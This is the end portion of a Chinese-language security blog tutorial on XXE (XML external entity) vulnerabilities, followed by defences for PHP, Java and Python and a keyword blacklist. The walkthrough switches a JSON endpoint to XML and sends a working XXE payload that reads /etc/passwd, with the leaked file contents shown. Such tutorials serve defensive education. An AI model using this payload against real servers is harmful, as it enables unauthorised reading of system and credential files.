</span></span><span class=line><span class=cl>{&#34;error&#34;: &#34;no results for name netspitest&#34;}
</span></span></code></pre></td></tr></table></div></div><p>现在我们尝试将 Content-Type 修改为 application/xml</p><h4 id=进一步请求和响应>进一步请求和响应：<a hidden class=anchor aria-hidden=true href=#进一步请求和响应>#</a></h4><p><strong>HTTP Request:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /netspi HTTP/1.1
</span></span><span class=line><span class=cl>Host: someserver.netspi.com
</span></span><span class=line><span class=cl>Accept: application/json
</span></span><span class=line><span class=cl>Content-Type: application/xml
</span></span><span class=line><span class=cl>Content-Length: 38
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;search&#34;:&#34;name&#34;,&#34;value&#34;:&#34;netspitest&#34;}
</span></span></code></pre></td></tr></table></div></div><p><strong>HTTP Response:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 500 Internal Server Error
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 127
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;errors&#34;:{&#34;errorMessage&#34;:&#34;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&#34;}}
</span></span></code></pre></td></tr></table></div></div><p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p><h4 id=最终的请求和响应>最终的请求和响应：<a hidden class=anchor aria-hidden=true href=#最终的请求和响应>#</a></h4><p><strong>HTTP Request:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /netspi HTTP/1.1
</span></span><span class=line><span class=cl>Host: someserver.netspi.com
</span></span><span class=line><span class=cl>Accept: application/json
</span></span><span class=line><span class=cl>Content-Type: application/xml
</span></span><span class=line><span class=cl>Content-Length: 288
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
</span></span><span class=line><span class=cl>&lt;root&gt;
</span></span><span class=line><span class=cl>&lt;search&gt;name&lt;/search&gt;
</span></span><span class=line><span class=cl>&lt;value&gt;&amp;xxe;&lt;/value&gt;
</span></span><span class=line><span class=cl>&lt;/root&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>HTTP Response:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 2467
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;error&#34;: &#34;no results for name root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/bin/sh
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/bin/sh
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync....
</span></span></code></pre></td></tr></table></div></div><h2 id=xxe-如何防御>XXE 如何防御<a hidden class=anchor aria-hidden=true href=#xxe-如何防御>#</a></h2><h3 id=方案一使用语言中推荐的禁用外部实体的方法>方案一：使用语言中推荐的禁用外部实体的方法<a hidden class=anchor aria-hidden=true href=#方案一使用语言中推荐的禁用外部实体的方法>#</a></h3><p><strong>PHP：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>libxml_disable_entity_loader</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>JAVA:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
</span></span><span class=line><span class=cl>dbf.setExpandEntityReferences(false);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;,true);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.setFeature(&#34;http://xml.org/sax/features/external-general-entities&#34;,false)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.setFeature(&#34;http://xml.org/sax/features/external-parameter-entities&#34;,false);
</span></span></code></pre></td></tr></table></div></div><p><strong>Python：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from lxml import etree
</span></span><span class=line><span class=cl>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</span></span></code></pre></td></tr></table></div></div><h3 id=方案二手动黑名单过滤不推荐>方案二：手动黑名单过滤(不推荐)<a hidden class=anchor aria-hidden=true href=#方案二手动黑名单过滤不推荐>#</a></h3><p>过滤关键词：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC
</span></span></code></pre></td></tr></table></div></div><p><strong>本文原作者 K0rz3n 。文章内容略有删减与修改</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://xz.aliyun.com/t/3357?time__1311=n4%2BxnD0DgGYQwqYq40HpDUhDfxGT%2BALux0K4x&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-0
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://leventfrais.github.io/tags/xxe/>Xxe</a></li><li><a href=https://leventfrais.github.io/tags/web%E5%AE%89%E5%85%A8/>Web安全</a></li><li><a href=https://leventfrais.github.io/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/>基础漏洞</a></li></ul><nav class=paginav><a class=prev href=https://leventfrais.github.io/posts/study/xss_basic/><span class=title>« 上一页</span><br><span>XSS漏洞基础</span>
</a><a class=next href=https://leventfrais.github.io/posts/articles/gbit_2405_exp/><span class=title>下一页 »</span><br><span>厦门吉比特信息安全岗24年5月实习面经</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://leventfrais.github.io/>3lizabeth's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量<span id=busuanzi_value_site_pv></span>次
</span><span id=busuanzi_container_site_uv>本站访客数<span id=busuanzi_value_site_uv></span>人次</span></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="复制";function s(){t.innerHTML="已复制！",setTimeout(()=>{t.innerHTML="复制"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>